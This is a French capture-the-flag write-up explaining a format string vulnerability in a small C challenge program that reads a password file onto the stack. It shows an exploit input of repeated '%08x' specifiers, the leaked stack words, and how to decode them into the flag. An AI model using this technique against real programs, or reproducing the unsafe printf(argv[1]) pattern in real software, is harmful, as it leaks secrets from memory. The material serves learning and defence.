```
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}

```

### Probléme

La ligne vulnérable est : `printf(argv[1]);`

Ici, argv[1] est contrôlé par l’utilisateur.

La version correcte aurait été : `printf("%s", argv[1]);` Là, argv[1] serait juste une chaîne affichée telle quelle.

**Quand printf voit %d, %x, %s, %p, etc., il va chercher des arguments supplémentaires sur la pile pour les afficher.**

Donc si on ecrit `printf("%x %x %x\n");` sans argument derrière, printf va quand même essayer de lire des “arguments”…

Il va prendre ce qu’il trouve sur la pile à cet endroit, et les interpréter comme des valeurs à afficher → lecture arbitraire de la pile.

### Ce que fait la vulnerabilité

Ici, la ligne :

`printf(argv[1]);`

permet à l’utilisateur d’écrire lui-même la chaîne de format.

Donc si je lance :

./ch5 "Bonjour"

le format est "Bonjour" => pas de % → pas de souci.

Mais si je lance :

./ch5 "%x %x %x %x"


Alors argv[1] = "%x %x %x %x"
=> printf va essayer d’afficher 4 entiers… qui n’ont jamais été donnés en arguments.
=> il va donc lire 4 mots sur la pile et les afficher en hexadécimal.

**On peux afficher des bouts de la pile → infos sensibles, adresses, variables locales.**

### Lien avec notre code

```
FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
char buffer[32];
fgets(buffer, sizeof(buffer), secret);
printf(argv[1]);

```

Le contenu du fichier secret .passwd est lu dans buffer, qui est une variable locale de main.

buffer se trouve donc sur la pile.

### Exploiter la faille

<img width="1091" height="53" alt="image" src="https://github.com/user-attachments/assets/8c830dee-e355-4b8f-80b3-3ee255185c3a" />


Chaque %08x signifie :

%x → afficher un entier depuis la pile

08 → sur 8 caractères hex, padding avec des 0

En envoyant 19 %08x, tu demandes à lire 19 valeurs de la pile, en séquence.

Proprement ca fais:

```
00000020
0804b160
0804853d
00000009
bffffd19
b7e19679
bffffbe4
b7fc1000
b7fc1000
0804b160
39617044   ← intéressant
28293664   ← intéressant
6d617045   ← intéressant
bf000a64
0804861b
00000002
bffffbe4
bffffbf0
9fa31a00

```

Les premières valeurs sont des adresses / trucs random sur la pile, on s’en fiche.
Ce qui nous intéresse, c’est là où ça commence à ressembler à du texte ASCII encodé en hex :

`39617044`

On découpe en octets :

`39 61 70 44`

En mémoire, ça veut dire en réalité : 44 70 61 39

0x44 → 'D'

0x70 → 'p'

0x61 → 'a'

0x39 → '9'

On fait ca avec les valeurs interresantes, on obtient le flag

